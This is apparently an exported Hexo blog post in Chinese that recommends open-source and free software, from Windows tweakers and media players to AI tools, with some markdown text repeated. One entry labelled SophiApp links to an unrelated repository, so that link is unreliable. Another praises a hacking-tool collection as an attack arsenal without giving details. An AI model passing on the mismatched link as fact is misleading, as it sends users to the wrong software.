是一款简单的磁盘基准测试软件。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/4.png\" />\n</div>\n\n* **[1Panel](https://github.com/1Panel-dev/1Panel)**\n\n现代化、开源的 Linux 服务器运维管理面板\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/17.png\" />\n</div>\n\n### 安卓应用区\n\n* **[organicmaps](https://github.com/organicmaps/organicmaps)**\n\n一款免费、没广告的离线地图应用。适用于旅行者、游客、徒步旅行者和骑行者的Android 和iOS 离线地图应用，它使用OpenStreetMap 数据，支持详细的离线地图、骑行路线、语音导航、等高线、海拔剖面、山峰和坡度等功能。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/2.png\" />\n</div>\n\n* **[BlackHole](https://github.com/Sangwan5688/BlackHole)**\n\n一款高颜值的音乐播放器应用。该项目是用 Flutter 写的高颜值、无广告、免费音乐播放器，拥有歌词、专辑、艺术家、播放列表、定时关闭等功能，支持 Android、iOS、macOS 系统。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/1.png\" />\n</div>\n\n### 高阶AI区\n\n* **[OpenCat](https://github.com/PetoiCamp/OpenCat)**\n\n开源的四足机器人宠物框架源码，这是一个基于Arduino 和Raspberry Pi 的四足机器人宠物框架，让你可通过C/C++/Python 编程语言操控四足机器人。该公司生产的迷你机器猫，神似玩具版的波士顿机械狗。\n\n* **[Bringing-Old-Photos-Back-to-Life](https://github.com/microsoft/Bringing-Old-Photos-Back-to-Life)**\n\n通过深度学习修复老照片的工具，由微软开源的深度学习项目，可用于修复破损的老照片，修复效果显著。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/6.jpg\" />\n</div>\n\n* **[Final2x](https://github.com/Tohrusky/Final2x/)**\n\n图片放大工具，免费开源，主要是清晰度会提高。\n\n<div align=\"center\" style=\"width:40%;\">\n  <img src=\"./OpenSourceSofts/18.png\" />\n</div>\n\n* **[AnimatedDrawings](https://github.com/facebookresearch/AnimatedDrawings)**\n\n让画作动起来的AI 项目。这是Meta AI 研究院开源的动画库，它能让你的画作动起来。无论是小朋友画的小人，还是高水平的卡通人物，该项目都能让它们跟着你一起做动作。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/1.gif\" />\n</div>\n\n### 不正经项目区\n\n* **[Wai](https://github.com/DukeLuo/wai)**\n\n一款可以预防颈椎病的项目。这是一个通过非正常的方式，展示历史上的今天和这个季节吃什么果蔬的内容，“强迫”你活动脖子从而实现预防颈椎病的目的。","source":"_posts/OpenSourceSofts.md","raw":"---\ntitle: 超良心的开源精品软件或项目\ndate: 2023-09-10 22:11:11\ncategories: 探索\ntags:\n  - 开源软件\n---\n\n本文旨在收集实用、安全、免费、有趣的开源项目或软件。\n\n<!-- more -->\n\n### Windows调优区\n\n* **[Optimizer](https://github.com/hellzerg/optimizer)**\n\n堪称是Windows 系统上最好用的性能优化器！\n\n<p align=\"center\" style=\"width:60%;\">\n   <img src=\"./OpenSourceSofts/5.png\">\n</p>\n\n* **[SophiApp](https://github.com/wangshusen/SearchEngine)**\n\n一款强大的 Windows 微调工具。这是一个用于微调 Windows 10 和 Windows 11 配置的调整器。它拥有现代化的操作界面，在保证系统稳定的前提下，提供了超过 130 种的调整选项。\n\n<p align=\"center\" style=\"width:60%;\">\n   <img src=\"./OpenSourceSofts/6.png\">\n</p>\n\n* **[ExplorerPatcher](https://github.com/valinet/ExplorerPatcher)**\n\n自由切换Windows11 开始菜单样式的工具。这是一款能够让Windows 11 的开始菜单栏(Explorer) 重回Windows 10 样式的扩展工具，除此之外还支持禁用Windows 11 的上下文菜单和命令栏等功能，让你在Windows 上拥有更舒适的工作环境。\n\n* **[memreduct](https://github.com/henrypp/memreduct)**\n\n内存自动优化清理，轻量级实时内存管理应用程序，用于监视和清理计算机上的系统内存。\n\n<p align=\"center\" style=\"width:50%;\">\n\t<img src=\"./OpenSourceSofts/7.png\" />\n</p>\n\n### Windows实用区\n\n* **[Everything](https://www.voidtools.com/zh-cn/)**\n\n本地文件搜索工具，属于本人装机必备的软件。\n\n<p align=\"center\" style=\"width:40%;\">\n\t<img src=\"./OpenSourceSofts/8.png\" />\n</p>\n\n* **[Geek](https://geekuninstaller.com/)**\n\n高效快速、小巧便携。100% 免费的Windows卸载工具，同时在卸载之后会自动清理注册表缓存，也属于我的装机必备软件。\n\n<p align=\"center\" style=\"width:30%;\">\n  <img src=\"./OpenSourceSofts/9.png\" />\n</p>\n\n* **[potplayer视频播放器](https://potplayer.daum.net/)**\n\n本人一直在用的视频播放器软件，几乎是装机必备的软件，功能很强大，唯一的缺点是只支持Windows系统。\n\n<p align=\"center\" style=\"width:50%;\">\n\t<img src=\"./OpenSourceSofts/10.png\" />\n</p>\n\n* **[VLC视频播放器](https://www.videolan.org/vlc/)**\n\nVLC 是一款免费、自由、开源的跨平台多媒体播放器及框架，可播放大多数多媒体文件，以及各类流媒体协议。可在所有平台运行 - Windows, Linux, Mac OS X, Unix, iOS, Android...   \n本人在Ubuntu上就是用的这个。\n\n<p align=\"center\" style=\"width:50%;\">\n\t<img src=\"./OpenSourceSofts/1.jpg\" />\n</p>\n\n* **[Captura](https://mathewsachin.github.io/blog/2023/04/09/captura-unmaintained.html)**\n\nCaptura是一款适用于 Windows 的屏幕捕获（屏幕截图、录制）应用程序，可以捕获屏幕、网络摄像头、音频和击键。它不再维护，但源代码仍然存档在 GitHub 上，有 8k+ star 和 1.5k+ fork。\n\n<p align=\"center\" style=\"width:30%;\">\n  <img src=\"./OpenSourceSofts/11.png\" />\n</p>\n\n* **[鼠标自动点击器（简单版）](https://github.com/InJeCTrL/ClickRun)** **[鼠标自动点击器（高级版）](https://github.com/taojy123/KeymouseGo)**\n\n可以帮我们自动完成一些机械性重复的工作！\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/3.png\" />\n</div>\n\n* **[server](https://github.com/screego/server/releases/tag/v1.10.0)**\n\n多用户的屏幕分享服务。它可以快速启动一个在线共享屏幕的服务，让用户无需安装任何软件，仅使用浏览器就能分享自己的屏幕画面。项目基于网页实时通信(WebRTC) 实现，由 STUN/TURN 协议完成内网穿透和浏览器端对端的连接，既实用又有源码可以学习。\n\n<p align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/12.png\" />\n</p>\n\n* **[Umi-OCR](https://github.com/hiroi-sora/Umi-OCR)**\n\nOCR图片转文字识别软件，完全离线。截屏/批量导入图片，支持多国语言、合并段落、竖排文字。可排除水印区域，提取干净的文本。基于 PaddleOCR 。基于 PaddleOCR 的 OCR 图片转文字识别软件。完全免费、可离线使用的开源软件，支持截屏识别文字、批量导入图片、横/竖排文字，还可以自动忽略水印区域，适用于 Win10、Win11 操作系统。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/13.png\" />\n</div>\n\n* **[Gopeed](https://gopeed.com/zh-CN)**\n\n一款支持全平台的下载器。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/2.jpg\" />\n</div>\n\n### Windows工作区\n\n* **[视频压缩神器](https://handbrake.fr/)**\n\nHandBrake 是一款由志愿者构建的开源工具，用于将视频从几乎任何格式转换为一系列广泛支持的现代编解码器。转换几乎任何格式的视频，免费和开源多平台（Windows、Mac 和 Linux）。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/3.jpg\" />\n</div>\n\n* **[LogicFlow](https://github.com/didi/LogicFlow/)**\n\n是一款流程图编辑框架，提供了一系列 流程图的交互、编辑所必需的功能和简单灵活的节点自定义、插件等拓展机制，方便我们快速在业务系统内满足类流程图的需求。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/2.gif\" />\n</div>\n\n* **[SpleeterGui](https://github.com/boy1dr/SpleeterGui)**\n\n一款Windows 上的音轨分离工具，它是第三方制作的Spleeter 桌面应用，支持中文在内的多国语言，可以将音乐里的人声和乐器声分离，轻松实现提取音乐中的伴奏。\n\n<div align=\"center\" style=\"width:40%;\">\n  <img src=\"./OpenSourceSofts/14.png\" />\n</div>\n\n### Windows娱乐区\n\n* **[lively](https://github.com/rocksdanister/lively)**\n\nWindows 动态桌面壁纸工具。支持 Windows 用户设置多种动画文件为桌面壁纸的工具，不仅安装简单效果炫酷，而且完全免费。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/4.jpg\" />\n</div>\n\n* **[jellyfin](https://github.com/jellyfin/jellyfin)**\n\n这是一款非常优秀的本地媒体库管理工具。完全免费、支持中文、安装简单、跨平台、功能强大的媒体库管理系统。它能把原本躺在文件夹里的视频文件，变成包含封面、描述、评分、演员表等信息的“影碟”，让视频整整齐齐、赏心悦目，还支持视频续播、订阅更新、多端可看，让你可以远离广告优雅地追剧。\n\n* **[calibre](https://github.com/kovidgoyal/calibre)**\n\n一款完全免费开源且功能强大的电子书管理工具。它是集下载、格式转化、制作、管理于一体的电子书工具，比如可以将 txt 文本，转化成包含作者信息和书籍封面的 mobi 文件，制作完成后还可以直接发送到 Kindle 设备上。 支持多种电子书格式，包括EPUB、MOBI、PDF等等。Calibre的功能非常强大，可以帮助用户轻松地管理自己的电子书库，包括添加、删除、重命名和搜索等。此外，它还提供了阅读器功能，用户可以在软件内直接阅读电子书，而不需要另外下载阅读器。你还可以可通过插件/扩展实现更多的功能。\n\n### 极客区\n\n* **[hackingtool](https://github.com/Z4nzu/hackingtool)**\n\n黑客工具全家桶。该项目收录了各种黑客工具，包括破解密码、SQL 注入、钓鱼攻击、XSS、DDos 等。堪称黑客军火库的开源项目啊\n\n<div align=\"center\" style=\"width:70%;\">\n  <img src=\"./OpenSourceSofts/15.png\" />\n</div>\n\n* **[Rocket.Chat](https://github.com/RocketChat/Rocket.Chat)**\n\n一款可自由定制的企业级开源通信平台源码。用它来可以搭建一个功能丰富的通信平台，可自托管做为 Slack 的开源替代品。支持创建频道、团队和讨论等多种不同功能的群聊，消息支持图片、文件、视频和语音，拥有包括 Windows、Linux、macOS、Android 和 iOS 在内的多种客户端。 如果你需要搭建一个安全加密，且具有高度私密性的通信平台，那么这款开源项目就非常适合你了。\n\n<div align=\"center\" style=\"width:70%;\">\n  <img src=\"./OpenSourceSofts/1.webp\" />\n</div>\n\n* **[vanblog](https://github.com/Mereithhh/vanblog)**\n\n实用的一站式个人博客系统。一款简洁优雅的博客系统，追求极致响应速度和博客体验。快到极致的响应速度，Lighthouse 接近满分。前后台均为响应式，支持 Docker 一键部署。前台为静态页面并支持增量渲染，按需构建更新页面。拒绝花里胡哨的功能，专注于个人博客场景。\n\n[vanblog快速上手](https://vanblog.mereith.com/guide/get-started.html)\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/16.png\" />\n</div>\n\n* **[HWiNFO ](https://www.hwinfo.com/)**\n\n适用于 Windows 和 DOS 的全面硬件分析、监控和报告。坦白说，是一个计算机硬件监测工具，并且可以生成报告保存、最全面的系统审计工具。受到了NASA、AMD、华硕、因特尔、戴尔、技嘉等厂商的一致认可。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/5.jpg\" />\n</div>\n\n* **[crystaldiskmark](https://crystalmark.info/en/software/crystaldiskmark/)**\n\nCrystalDiskMark 是一款简单的磁盘基准测试软件。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/4.png\" />\n</div>\n\n* **[1Panel](https://github.com/1Panel-dev/1Panel)**\n\n现代化、开源的 Linux 服务器运维管理面板\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/17.png\" />\n</div>\n\n### 安卓应用区\n\n* **[organicmaps](https://github.com/organicmaps/organicmaps)**\n\n一款免费、没广告的离线地图应用。适用于旅行者、游客、徒步旅行者和骑行者的Android 和iOS 离线地图应用，它使用OpenStreetMap 数据，支持详细的离线地图、骑行路线、语音导航、等高线、海拔剖面、山峰和坡度等功能。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/2.png\" />\n</div>\n\n* **[BlackHole](https://github.com/Sangwan5688/BlackHole)**\n\n一款高颜值的音乐播放器应用。该项目是用 Flutter 写的高颜值、无广告、免费音乐播放器，拥有歌词、专辑、艺术家、播放列表、定时关闭等功能，支持 Android、iOS、macOS 系统。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/1.png\" />\n</div>\n\n### 高阶AI区\n\n* **[OpenCat](https://github.com/PetoiCamp/OpenCat)**\n\n开源的四足机器人宠物框架源码，这是一个基于Arduino 和Raspberry Pi 的四足机器人宠物框架，让你可通过C/C++/Python 编程语言操控四足机器人。该公司生产的迷你机器猫，神似玩具版的波士顿机械狗。\n\n* **[Bringing-Old-Photos-Back-to-Life](https://github.com/microsoft/Bringing-Old-Photos-Back-to-Life)**\n\n通过深度学习修复老照片的工具，由微软开源的深度学习项目，可用于修复破损的老照片，修复效果显著。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/6.jpg\" />\n</div>\n\n* **[Final2x](https://github.com/Tohrusky/Final2x/)**\n\n图片放大工具，免费开源，主要是清晰度会提高。\n\n<div align=\"center\" style=\"width:40%;\">\n  <img src=\"./OpenSourceSofts/18.png\" />\n</div>\n\n* **[AnimatedDrawings](https://github.com/facebookresearch/AnimatedDrawings)**\n\n让画作动起来的AI 项目。这是Meta AI 研究院开源的动画库，它能让你的画作动起来。无论是小朋友画的小人，还是高水平的卡通人物，该项目都能让它们跟着你一起做动作。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/1.gif\" />\n</div>\n\n### 不正经项目区\n\n* **[Wai](https://github.com/DukeLuo/wai)**\n\n一款可以预防颈椎病的项目。这是一个通过非正常的方式，展示历史上的今天和这个季节吃什么果蔬的内容，“强迫”你活动脖子从而实现预防颈椎病的目的。","slug":"OpenSourceSofts","published":1,"updated":"2024-05-03T03:55:54.737Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ed00387zj34dejh7tr","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>本文旨在收集实用、安全、免费、有趣的开源项目或软件。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"Windows调优区\"><a href=\"#Windows调优区\" class=\"headerlink\" title=\"Windows调优区\"></a>Windows调优区</h3><ul>\n<li><strong><a href=\"https://github.com/hellzerg/optimizer\">Optimizer</a></strong></li>\n</ul>\n<p>堪称是Windows 系统上最好用的性能优化器！</p>\n<p align=\"center\" style=\"width:60%;\">\n   <img src=\"/2023/09/10/OpenSourceSofts/5.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://github.com/wangshusen/SearchEngine\">SophiApp</a></strong></li>\n</ul>\n<p>一款强大的 Windows 微调工具。这是一个用于微调 Windows 10 和 Windows 11 配置的调整器。它拥有现代化的操作界面，在保证系统稳定的前提下，提供了超过 130 种的调整选项。</p>\n<p align=\"center\" style=\"width:60%;\">\n   <img src=\"/2023/09/10/OpenSourceSofts/6.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://github.com/valinet/ExplorerPatcher\">ExplorerPatcher</a></strong></li>\n</ul>\n<p>自由切换Windows11 开始菜单样式的工具。这是一款能够让Windows 11 的开始菜单栏(Explorer) 重回Windows 10 样式的扩展工具，除此之外还支持禁用Windows 11 的上下文菜单和命令栏等功能，让你在Windows 上拥有更舒适的工作环境。</p>\n<ul>\n<li><strong><a href=\"https://github.com/henrypp/memreduct\">memreduct</a></strong></li>\n</ul>\n<p>内存自动优化清理，轻量级实时内存管理应用程序，用于监视和清理计算机上的系统内存。</p>\n<p align=\"center\" style=\"width:50%;\">\n    <img src=\"/2023/09/10/OpenSourceSofts/7.png\">\n</p>\n\n<h3 id=\"Windows实用区\"><a href=\"#Windows实用区\" class=\"headerlink\" title=\"Windows实用区\"></a>Windows实用区</h3><ul>\n<li><strong><a href=\"https://www.voidtools.com/zh-cn/\">Everything</a></strong></li>\n</ul>\n<p>本地文件搜索工具，属于本人装机必备的软件。</p>\n<p align=\"center\" style=\"width:40%;\">\n    <img src=\"/2023/09/10/OpenSourceSofts/8.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://geekuninstaller.com/\">Geek</a></strong></li>\n</ul>\n<p>高效快速、小巧便携。100% 免费的Windows卸载工具，同时在卸载之后会自动清理注册表缓存，也属于我的装机必备软件。</p>\n<p align=\"center\" style=\"width:30%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/9.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://potplayer.daum.net/\">potplayer视频播放器</a></strong></li>\n</ul>\n<p>本人一直在用的视频播放器软件，几乎是装机必备的软件，功能很强大，唯一的缺点是只支持Windows系统。</p>\n<p align=\"center\" style=\"width:50%;\">\n    <img src=\"/2023/09/10/OpenSourceSofts/10.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://www.videolan.org/vlc/\">VLC视频播放器</a></strong></li>\n</ul>\n<p>VLC 是一款免费、自由、开源的跨平台多媒体播放器及框架，可播放大多数多媒体文件，以及各类流媒体协议。可在所有平台运行 - Windows, Linux, Mac OS X, Unix, iOS, Android…<br>本人在Ubuntu上就是用的这个。</p>\n<p align=\"center\" style=\"width:50%;\">\n    <img src=\"/2023/09/10/OpenSourceSofts/1.jpg\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://mathewsachin.github.io/blog/2023/04/09/captura-unmaintained.html\">Captura</a></strong></li>\n</ul>\n<p>Captura是一款适用于 Windows 的屏幕捕获（屏幕截图、录制）应用程序，可以捕获屏幕、网络摄像头、音频和击键。它不再维护，但源代码仍然存档在 GitHub 上，有 8k+ star 和 1.5k+ fork。</p>\n<p align=\"center\" style=\"width:30%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/11.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://github.com/InJeCTrL/ClickRun\">鼠标自动点击器（简单版）</a></strong> <strong><a href=\"https://github.com/taojy123/KeymouseGo\">鼠标自动点击器（高级版）</a></strong></li>\n</ul>\n<p>可以帮我们自动完成一些机械性重复的工作！</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/3.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/screego/server/releases/tag/v1.10.0\">server</a></strong></li>\n</ul>\n<p>多用户的屏幕分享服务。它可以快速启动一个在线共享屏幕的服务，让用户无需安装任何软件，仅使用浏览器就能分享自己的屏幕画面。项目基于网页实时通信(WebRTC) 实现，由 STUN&#x2F;TURN 协议完成内网穿透和浏览器端对端的连接，既实用又有源码可以学习。</p>\n<p align=\"center\" style=\"width:50%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/12.png\">\n</p>\n\n<ul>\n<li><strong><a href=\"https://github.com/hiroi-sora/Umi-OCR\">Umi-OCR</a></strong></li>\n</ul>\n<p>OCR图片转文字识别软件，完全离线。截屏&#x2F;批量导入图片，支持多国语言、合并段落、竖排文字。可排除水印区域，提取干净的文本。基于 PaddleOCR 。基于 PaddleOCR 的 OCR 图片转文字识别软件。完全免费、可离线使用的开源软件，支持截屏识别文字、批量导入图片、横&#x2F;竖排文字，还可以自动忽略水印区域，适用于 Win10、Win11 操作系统。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/13.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://gopeed.com/zh-CN\">Gopeed</a></strong></li>\n</ul>\n<p>一款支持全平台的下载器。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/2.jpg\">\n</div>\n\n<h3 id=\"Windows工作区\"><a href=\"#Windows工作区\" class=\"headerlink\" title=\"Windows工作区\"></a>Windows工作区</h3><ul>\n<li><strong><a href=\"https://handbrake.fr/\">视频压缩神器</a></strong></li>\n</ul>\n<p>HandBrake 是一款由志愿者构建的开源工具，用于将视频从几乎任何格式转换为一系列广泛支持的现代编解码器。转换几乎任何格式的视频，免费和开源多平台（Windows、Mac 和 Linux）。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/3.jpg\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/didi/LogicFlow/\">LogicFlow</a></strong></li>\n</ul>\n<p>是一款流程图编辑框架，提供了一系列 流程图的交互、编辑所必需的功能和简单灵活的节点自定义、插件等拓展机制，方便我们快速在业务系统内满足类流程图的需求。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/2.gif\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/boy1dr/SpleeterGui\">SpleeterGui</a></strong></li>\n</ul>\n<p>一款Windows 上的音轨分离工具，它是第三方制作的Spleeter 桌面应用，支持中文在内的多国语言，可以将音乐里的人声和乐器声分离，轻松实现提取音乐中的伴奏。</p>\n<div align=\"center\" style=\"width:40%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/14.png\">\n</div>\n\n<h3 id=\"Windows娱乐区\"><a href=\"#Windows娱乐区\" class=\"headerlink\" title=\"Windows娱乐区\"></a>Windows娱乐区</h3><ul>\n<li><strong><a href=\"https://github.com/rocksdanister/lively\">lively</a></strong></li>\n</ul>\n<p>Windows 动态桌面壁纸工具。支持 Windows 用户设置多种动画文件为桌面壁纸的工具，不仅安装简单效果炫酷，而且完全免费。</p>\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/4.jpg\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/jellyfin/jellyfin\">jellyfin</a></strong></li>\n</ul>\n<p>这是一款非常优秀的本地媒体库管理工具。完全免费、支持中文、安装简单、跨平台、功能强大的媒体库管理系统。它能把原本躺在文件夹里的视频文件，变成包含封面、描述、评分、演员表等信息的“影碟”，让视频整整齐齐、赏心悦目，还支持视频续播、订阅更新、多端可看，让你可以远离广告优雅地追剧。</p>\n<ul>\n<li><strong><a href=\"https://github.com/kovidgoyal/calibre\">calibre</a></strong></li>\n</ul>\n<p>一款完全免费开源且功能强大的电子书管理工具。它是集下载、格式转化、制作、管理于一体的电子书工具，比如可以将 txt 文本，转化成包含作者信息和书籍封面的 mobi 文件，制作完成后还可以直接发送到 Kindle 设备上。 支持多种电子书格式，包括EPUB、MOBI、PDF等等。Calibre的功能非常强大，可以帮助用户轻松地管理自己的电子书库，包括添加、删除、重命名和搜索等。此外，它还提供了阅读器功能，用户可以在软件内直接阅读电子书，而不需要另外下载阅读器。你还可以可通过插件&#x2F;扩展实现更多的功能。</p>\n<h3 id=\"极客区\"><a href=\"#极客区\" class=\"headerlink\" title=\"极客区\"></a>极客区</h3><ul>\n<li><strong><a href=\"https://github.com/Z4nzu/hackingtool\">hackingtool</a></strong></li>\n</ul>\n<p>黑客工具全家桶。该项目收录了各种黑客工具，包括破解密码、SQL 注入、钓鱼攻击、XSS、DDos 等。堪称黑客军火库的开源项目啊</p>\n<div align=\"center\" style=\"width:70%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/15.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/RocketChat/Rocket.Chat\">Rocket.Chat</a></strong></li>\n</ul>\n<p>一款可自由定制的企业级开源通信平台源码。用它来可以搭建一个功能丰富的通信平台，可自托管做为 Slack 的开源替代品。支持创建频道、团队和讨论等多种不同功能的群聊，消息支持图片、文件、视频和语音，拥有包括 Windows、Linux、macOS、Android 和 iOS 在内的多种客户端。 如果你需要搭建一个安全加密，且具有高度私密性的通信平台，那么这款开源项目就非常适合你了。</p>\n<div align=\"center\" style=\"width:70%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/1.webp\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/Mereithhh/vanblog\">vanblog</a></strong></li>\n</ul>\n<p>实用的一站式个人博客系统。一款简洁优雅的博客系统，追求极致响应速度和博客体验。快到极致的响应速度，Lighthouse 接近满分。前后台均为响应式，支持 Docker 一键部署。前台为静态页面并支持增量渲染，按需构建更新页面。拒绝花里胡哨的功能，专注于个人博客场景。</p>\n<p><a href=\"https://vanblog.mereith.com/guide/get-started.html\">vanblog快速上手</a></p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/16.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://www.hwinfo.com/\">HWiNFO </a></strong></li>\n</ul>\n<p>适用于 Windows 和 DOS 的全面硬件分析、监控和报告。坦白说，是一个计算机硬件监测工具，并且可以生成报告保存、最全面的系统审计工具。受到了NASA、AMD、华硕、因特尔、戴尔、技嘉等厂商的一致认可。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/5.jpg\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://crystalmark.info/en/software/crystaldiskmark/\">crystaldiskmark</a></strong></li>\n</ul>\n<p>CrystalDiskMark 是一款简单的磁盘基准测试软件。</p>\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/4.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/1Panel-dev/1Panel\">1Panel</a></strong></li>\n</ul>\n<p>现代化、开源的 Linux 服务器运维管理面板</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/17.png\">\n</div>\n\n<h3 id=\"安卓应用区\"><a href=\"#安卓应用区\" class=\"headerlink\" title=\"安卓应用区\"></a>安卓应用区</h3><ul>\n<li><strong><a href=\"https://github.com/organicmaps/organicmaps\">organicmaps</a></strong></li>\n</ul>\n<p>一款免费、没广告的离线地图应用。适用于旅行者、游客、徒步旅行者和骑行者的Android 和iOS 离线地图应用，它使用OpenStreetMap 数据，支持详细的离线地图、骑行路线、语音导航、等高线、海拔剖面、山峰和坡度等功能。</p>\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/2.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/Sangwan5688/BlackHole\">BlackHole</a></strong></li>\n</ul>\n<p>一款高颜值的音乐播放器应用。该项目是用 Flutter 写的高颜值、无广告、免费音乐播放器，拥有歌词、专辑、艺术家、播放列表、定时关闭等功能，支持 Android、iOS、macOS 系统。</p>\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/1.png\">\n</div>\n\n<h3 id=\"高阶AI区\"><a href=\"#高阶AI区\" class=\"headerlink\" title=\"高阶AI区\"></a>高阶AI区</h3><ul>\n<li><strong><a href=\"https://github.com/PetoiCamp/OpenCat\">OpenCat</a></strong></li>\n</ul>\n<p>开源的四足机器人宠物框架源码，这是一个基于Arduino 和Raspberry Pi 的四足机器人宠物框架，让你可通过C&#x2F;C++&#x2F;Python 编程语言操控四足机器人。该公司生产的迷你机器猫，神似玩具版的波士顿机械狗。</p>\n<ul>\n<li><strong><a href=\"https://github.com/microsoft/Bringing-Old-Photos-Back-to-Life\">Bringing-Old-Photos-Back-to-Life</a></strong></li>\n</ul>\n<p>通过深度学习修复老照片的工具，由微软开源的深度学习项目，可用于修复破损的老照片，修复效果显著。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/6.jpg\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/Tohrusky/Final2x/\">Final2x</a></strong></li>\n</ul>\n<p>图片放大工具，免费开源，主要是清晰度会提高。</p>\n<div align=\"center\" style=\"width:40%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/18.png\">\n</div>\n\n<ul>\n<li><strong><a href=\"https://github.com/facebookresearch/AnimatedDrawings\">AnimatedDrawings</a></strong></li>\n</ul>\n<p>让画作动起来的AI 项目。这是Meta AI 研究院开源的动画库，它能让你的画作动起来。无论是小朋友画的小人，还是高水平的卡通人物，该项目都能让它们跟着你一起做动作。</p>\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"/2023/09/10/OpenSourceSofts/1.gif\">\n</div>\n\n<h3 id=\"不正经项目区\"><a href=\"#不正经项目区\" class=\"headerlink\" title=\"不正经项目区\"></a>不正经项目区</h3><ul>\n<li><strong><a href=\"https://github.com/DukeLuo/wai\">Wai</a></strong></li>\n</ul>\n<p>一款可以预防颈椎病的项目。这是一个通过非正常的方式，展示历史上的今天和这个季节吃什么果蔬的内容，“强迫”你活动脖子从而实现预防颈椎病的目的。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    